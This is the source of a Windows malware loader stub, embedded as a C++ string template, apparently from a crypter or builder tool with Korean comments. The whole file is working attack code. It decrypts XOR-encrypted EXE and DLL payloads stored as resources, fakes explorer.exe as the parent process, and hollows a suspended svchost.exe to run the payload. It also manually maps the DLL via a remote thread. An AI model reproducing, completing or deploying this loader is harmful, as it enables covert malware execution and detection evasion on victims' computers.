const char* STUB_TEMPLATE = R"(
#include <windows.h>
#include <iostream>
#include <vector>
#include <tlhelp32.h>

#ifndef IMAGE_SIZEOF_BASE_RELOCATION
#define IMAGE_SIZEOF_BASE_RELOCATION       (sizeof(IMAGE_BASE_RELOCATION))
#endif

// 리소스 ID 정의
#define EXE_PAYLOAD 101
#define DLL_PAYLOAD 102

typedef HMODULE(WINAPI* LoadLibraryA_t)(LPCSTR);
typedef FARPROC(WINAPI* GetProcAddress_t)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* GetModuleHandleA_t)(LPCSTR);
typedef DWORD(WINAPI* GetModuleFileNameA_t)(HMODULE, LPSTR, DWORD);
typedef BOOL(WINAPI* CreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL(WINAPI* GetThreadContext_t)(HANDLE, LPCONTEXT);
typedef LPVOID(WINAPI* VirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* SetThreadContext_t)(HANDLE, const CONTEXT*);
typedef DWORD(WINAPI* ResumeThread_t)(HANDLE);
typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
typedef HANDLE(WINAPI* CreateRemoteThread_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HANDLE(WINAPI* OpenProcess_t)(DWORD, BOOL, DWORD);
typedef HANDLE(WINAPI* CreateToolhelp32Snapshot_t)(DWORD, DWORD);
typedef BOOL(WINAPI* Process32First_t)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI* Process32Next_t)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI* InitializeProcThreadAttributeList_t)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
typedef BOOL(WINAPI* UpdateProcThreadAttribute_t)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
typedef VOID(WINAPI* DeleteProcThreadAttributeList_t)(LPPROC_THREAD_ATTRIBUTE_LIST);
typedef int(WINAPI* lstrcmpA_t)(LPCSTR, LPCSTR);
typedef LPSTR(WINAPI* lstrcatA_t)(LPSTR, LPCSTR);
typedef HRSRC(WINAPI* FindResourceA_t)(HMODULE, LPCSTR, LPCSTR);
typedef HGLOBAL(WINAPI* LoadResource_t)(HMODULE, HRSRC);
typedef LPVOID(WINAPI* LockResource_t)(HGLOBAL);
typedef DWORD(WINAPI* SizeofResource_t)(HMODULE, HRSRC);


typedef BOOL(WINAPI* DllMain_t)(HMODULE, DWORD, LPVOID);

struct ManualMappingData {
    LoadLibraryA_t pLoadLibraryA;
    GetProcAddress_t pGetProcAddress;
    LPVOID imageBase;
};

struct {
    GetModuleHandleA_t GetModuleHandleA;
    GetProcAddress_t GetProcAddress;
    LoadLibraryA_t LoadLibraryA;
    GetModuleFileNameA_t GetModuleFileNameA;
    CreateProcessA_t CreateProcessA;
    GetThreadContext_t GetThreadContext;
    VirtualAllocEx_t VirtualAllocEx;
    WriteProcessMemory_t WriteProcessMemory;
    SetThreadContext_t SetThreadContext;
    ResumeThread_t ResumeThread;
    CloseHandle_t CloseHandle;
    CreateRemoteThread_t CreateRemoteThread;
    OpenProcess_t OpenProcess;
    CreateToolhelp32Snapshot_t CreateToolhelp32Snapshot;
    Process32First_t Process32First;
    Process32Next_t Process32Next;
    InitializeProcThreadAttributeList_t InitializeProcThreadAttributeList;
    UpdateProcThreadAttribute_t UpdateProcThreadAttribute;
    DeleteProcThreadAttributeList_t DeleteProcThreadAttributeList;
    lstrcmpA_t lstrcmpA;
    lstrcatA_t lstrcatA;
    FindResourceA_t FindResourceA;
    LoadResource_t LoadResource;
    LockResource_t LockResource;
    SizeofResource_t SizeofResource;
} API;

const char key[] = "mysecretkey";

void xor_decrypt(unsigned char* data, size_t size) {
    for (size_t i = 0; i < size; ++i) {
        data[i] ^= key[i % (sizeof(key) - 1)];
    }
}

// 리소스에서 페이로드를 로드하는 함수
std::vector<unsigned char> LoadPayloadFromResource(HMODULE hCurrent, int resourceId) {
    HRSRC hRes = API.FindResourceA(hCurrent, MAKEINTRESOURCEA(resourceId), "BIN");
    if (!hRes) return {};
    DWORD dwSize = API.SizeofResource(hCurrent, hRes);
    if (dwSize == 0) return {};
    HGLOBAL hResLoad = API.LoadResource(hCurrent, hRes);
    if (!hResLoad) return {};
    LPVOID pResLock = API.LockResource(hResLoad);
    if (!pResLock) return {};

    std::vector<unsigned char> payload(dwSize);
    memcpy(payload.data(), pResLock, dwSize);
    return payload;
}


DWORD WINAPI ManualMapLibrary(LPVOID lpParameter) {
    ManualMappingData* data = (ManualMappingData*)lpParameter;
    if (!data || !data->imageBase) return 0;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)data->imageBase;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)data->imageBase + pDosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOptHeader = &pNtHeaders->OptionalHeader;

    if(pOptHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0)
    {
        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)data->imageBase + pOptHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        while (pImportDesc->Name) {
            char* moduleName = (char*)((LPBYTE)data->imageBase + pImportDesc->Name);
            HMODULE hModule = data->pLoadLibraryA(moduleName);
            if (!hModule) return 0;

            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((LPBYTE)data->imageBase + pImportDesc->OriginalFirstThunk);
            PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)((LPBYTE)data->imageBase + pImportDesc->FirstThunk);

            while (pThunk->u1.AddressOfData) {
                if (IMAGE_SNAP_BY_ORDINAL(pThunk->u1.Ordinal)) {
                    pIAT->u1.Function = (ULONGLONG)data->pGetProcAddress(hModule, (LPCSTR)IMAGE_ORDINAL(pThunk->u1.Ordinal));
                } else {
                    PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)data->imageBase + pThunk->u1.AddressOfData);
                    pIAT->u1.Function = (ULONGLONG)data->pGetProcAddress(hModule, pImportByName->Name);
                }
                pThunk++;
                pIAT++;
            }
            pImportDesc++;
        }
    }

    if (pOptHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
        PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)data->imageBase + pOptHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        ULONGLONG delta = (ULONGLONG)((LPBYTE)data->imageBase - pOptHeader->ImageBase);

        while (pBaseReloc->VirtualAddress) {
            LPBYTE dest = (LPBYTE)data->imageBase + pBaseReloc->VirtualAddress;
            USHORT* relocInfo = (USHORT*)((LPBYTE)pBaseReloc + IMAGE_SIZEOF_BASE_RELOCATION);

            for (DWORD i = 0; i < (pBaseReloc->SizeOfBlock - IMAGE_SIZEOF_BASE_RELOCATION) / sizeof(USHORT); ++i) {
                int type = relocInfo[i] >> 12;
                int offset = relocInfo[i] & 0xFFF;

                if (type == IMAGE_REL_BASED_HIGHLOW) {
                    *(DWORD*)(dest + offset) += (DWORD)delta;
                }
                else if (type == IMAGE_REL_BASED_DIR64){
                    *(ULONGLONG*)(dest + offset) += delta;
                }
            }
            pBaseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)pBaseReloc + pBaseReloc->SizeOfBlock);
        }
    }

    if (pOptHeader->AddressOfEntryPoint) {
        DllMain_t DllMain = (DllMain_t)((LPBYTE)data->imageBase + pOptHeader->AddressOfEntryPoint);
        DllMain((HMODULE)data->imageBase, DLL_PROCESS_ATTACH, NULL);
    }
    return 1;
}

DWORD GetProcessIdByName(const char* processName, CreateToolhelp32Snapshot_t pCreateToolhelp32Snapshot, Process32First_t pProcess32First, Process32Next_t pProcess32Next, CloseHandle_t pCloseHandle, lstrcmpA_t p_lstrcmpA) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (pProcess32First(hSnapshot, &pe32)) {
        do {
            if (p_lstrcmpA(pe32.szExeFile, processName) == 0) {
                pCloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (pProcess32Next(hSnapshot, &pe32));
    }
    pCloseHandle(hSnapshot);
    return 0;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) return 1;

    API.GetProcAddress = (GetProcAddress_t)GetProcAddress(hKernel32, "GetProcAddress");
    API.LoadLibraryA = (LoadLibraryA_t)API.GetProcAddress(hKernel32, "LoadLibraryA");
    
    API.GetModuleHandleA = (GetModuleHandleA_t)API.GetProcAddress(hKernel32, "GetModuleHandleA");
    API.GetModuleFileNameA = (GetModuleFileNameA_t)API.GetProcAddress(hKernel32, "GetModuleFileNameA");
    API.CreateProcessA = (CreateProcessA_t)API.GetProcAddress(hKernel32, "CreateProcessA");
    API.GetThreadContext = (GetThreadContext_t)API.GetProcAddress(hKernel32, "GetThreadContext");
    API.VirtualAllocEx = (VirtualAllocEx_t)API.GetProcAddress(hKernel32, "VirtualAllocEx");
    API.WriteProcessMemory = (WriteProcessMemory_t)API.GetProcAddress(hKernel32, "WriteProcessMemory");
    API.SetThreadContext = (SetThreadContext_t)API.GetProcAddress(hKernel32, "SetThreadContext");
    API.ResumeThread = (ResumeThread_t)API.GetProcAddress(hKernel32, "ResumeThread");
    API.CloseHandle = (CloseHandle_t)API.GetProcAddress(hKernel32, "CloseHandle");
    API.CreateRemoteThread = (CreateRemoteThread_t)API.GetProcAddress(hKernel32, "CreateRemoteThread");
    API.OpenProcess = (OpenProcess_t)API.GetProcAddress(hKernel32, "OpenProcess");
    API.CreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t)API.GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
    API.Process32First = (Process32First_t)API.GetProcAddress(hKernel32, "Process32First");
    API.Process32Next = (Process32Next_t)API.GetProcAddress(hKernel32, "Process32Next");
    API.InitializeProcThreadAttributeList = (InitializeProcThreadAttributeList_t)API.GetProcAddress(hKernel32, "InitializeProcThreadAttributeList");
    API.UpdateProcThreadAttribute = (UpdateProcThreadAttribute_t)API.GetProcAddress(hKernel32, "UpdateProcThreadAttribute");
    API.DeleteProcThreadAttributeList = (DeleteProcThreadAttributeList_t)API.GetProcAddress(hKernel32, "DeleteProcThreadAttributeList");
    API.lstrcmpA = (lstrcmpA_t)API.GetProcAddress(hKernel32, "lstrcmpA");
    API.lstrcatA = (lstrcatA_t)API.GetProcAddress(hKernel32, "lstrcatA");
    API.FindResourceA = (FindResourceA_t)API.GetProcAddress(hKernel32, "FindResourceA");
    API.LoadResource = (LoadResource_t)API.GetProcAddress(hKernel32, "LoadResource");
    API.LockResource = (LockResource_t)API.GetProcAddress(hKernel32, "LockResource");
    API.SizeofResource = (SizeofResource_t)API.GetProcAddress(hKernel32, "SizeofResource");

    if (API.lstrcmpA(lpCmdLine, "--detached") != 0) {
        char currentPath[MAX_PATH];
        API.GetModuleFileNameA(NULL, currentPath, MAX_PATH);
        char commandLine[MAX_PATH + 20] = {0};
        API.lstrcatA(commandLine, "\"");
        API.lstrcatA(commandLine, currentPath);
        API.lstrcatA(commandLine, "\" --detached");
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        if(API.CreateProcessA(NULL, commandLine, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &si, &pi))
        {
            API.CloseHandle(pi.hProcess);
            API.CloseHandle(pi.hThread);
        }
        return 0;
    }
    
    HMODULE hSelf = API.GetModuleHandleA(NULL);
    std::vector<unsigned char> encrypted_exe = LoadPayloadFromResource(hSelf, EXE_PAYLOAD);
    std::vector<unsigned char> encrypted_dll = LoadPayloadFromResource(hSelf, DLL_PAYLOAD);
    
    if (encrypted_exe.empty() || encrypted_dll.empty()) return 1;

    xor_decrypt(encrypted_exe.data(), encrypted_exe.size());
    xor_decrypt(encrypted_dll.data(), encrypted_dll.size());

    DWORD explorerPid = GetProcessIdByName("explorer.exe", API.CreateToolhelp32Snapshot, API.Process32First, API.Process32Next, API.CloseHandle, API.lstrcmpA);
    if (explorerPid == 0) return 1;

    HANDLE hParentProcess = API.OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorerPid);
    if (!hParentProcess) return 1;

    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;
    memset(&si, 0, sizeof(STARTUPINFOEXA));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    API.InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)VirtualAlloc(NULL, attributeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!si.lpAttributeList) {
        API.CloseHandle(hParentProcess);
        return 1;
    }
    if (!API.InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize)) {
        VirtualFree(si.lpAttributeList, 0, MEM_RELEASE);
        API.CloseHandle(hParentProcess);
        return 1;
    }
    if (!API.UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        API.DeleteProcThreadAttributeList(si.lpAttributeList);
        VirtualFree(si.lpAttributeList, 0, MEM_RELEASE);
        API.CloseHandle(hParentProcess);
        return 1;
    }
    
    char targetPath[MAX_PATH];
    ExpandEnvironmentStringsA("%windir%\\System32\\svchost.exe", targetPath, MAX_PATH);

    if (API.CreateProcessA(NULL, targetPath, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)encrypted_exe.data();
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)encrypted_exe.data() + pDosHeader->e_lfanew);
        
        CONTEXT context;
        context.ContextFlags = CONTEXT_FULL;
        API.GetThreadContext(pi.hThread, &context);

        LPVOID imageBase = API.VirtualAllocEx(pi.hProcess, (LPVOID)pNtHeaders->OptionalHeader.ImageBase, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!imageBase) {
            imageBase = API.VirtualAllocEx(pi.hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        }

        if (imageBase) {
            API.WriteProcessMemory(pi.hProcess, imageBase, encrypted_exe.data(), pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
            for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
                PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)encrypted_exe.data() + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
                API.WriteProcessMemory(pi.hProcess, (LPVOID)((LPBYTE)imageBase + pSectionHeader->VirtualAddress), (LPVOID)((LPBYTE)encrypted_exe.data() + pSectionHeader->PointerToRawData), pSectionHeader->SizeOfRawData, NULL);
            }

            #ifdef _WIN64
            context.Rcx = (ULONGLONG)((LPBYTE)imageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
            API.WriteProcessMemory(pi.hProcess, (LPVOID)(context.Rdx + 16), &imageBase, sizeof(LPVOID), NULL);
            #else
            context.Eax = (DWORD)((LPBYTE)imageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
            API.WriteProcessMemory(pi.hProcess, (LPVOID)(context.Ebx + 8), &imageBase, sizeof(LPVOID), NULL);
            #endif
            
            API.SetThreadContext(pi.hThread, &context);

            PIMAGE_DOS_HEADER pDllDosHeader = (PIMAGE_DOS_HEADER)encrypted_dll.data();
            PIMAGE_NT_HEADERS pDllNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)encrypted_dll.data() + pDllDosHeader->e_lfanew);

            LPVOID dllBase = API.VirtualAllocEx(pi.hProcess, NULL, pDllNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (dllBase) {
                API.WriteProcessMemory(pi.hProcess, dllBase, encrypted_dll.data(), pDllNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
                for (int i = 0; i < pDllNtHeaders->FileHeader.NumberOfSections; i++) {
                    PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)encrypted_dll.data() + pDllDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
                    API.WriteProcessMemory(pi.hProcess, (LPVOID)((LPBYTE)dllBase + pSectionHeader->VirtualAddress), (LPVOID)((LPBYTE)encrypted_dll.data() + pSectionHeader->PointerToRawData), pSectionHeader->SizeOfRawData, NULL);
                }

                ManualMappingData mappingData;
                mappingData.pLoadLibraryA = API.LoadLibraryA;
                mappingData.pGetProcAddress = API.GetProcAddress;
                mappingData.imageBase = dllBase;

                LPVOID pMappingData = API.VirtualAllocEx(pi.hProcess, NULL, sizeof(ManualMappingData), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                API.WriteProcessMemory(pi.hProcess, pMappingData, &mappingData, sizeof(ManualMappingData), NULL);

                LPVOID pShellcode = API.VirtualAllocEx(pi.hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                API.WriteProcessMemory(pi.hProcess, pShellcode, ManualMapLibrary, 4096, NULL);

                HANDLE hThread = API.CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcode, pMappingData, 0, NULL);
                API.CloseHandle(hThread);
            }
            
            API.ResumeThread(pi.hThread);
        }

        API.CloseHandle(pi.hProcess);
        API.CloseHandle(pi.hThread);
    }
    
    API.DeleteProcThreadAttributeList(si.lpAttributeList);
    VirtualFree(si.lpAttributeList, 0, MEM_RELEASE);
    API.CloseHandle(hParentProcess);

    return 0;
}
)";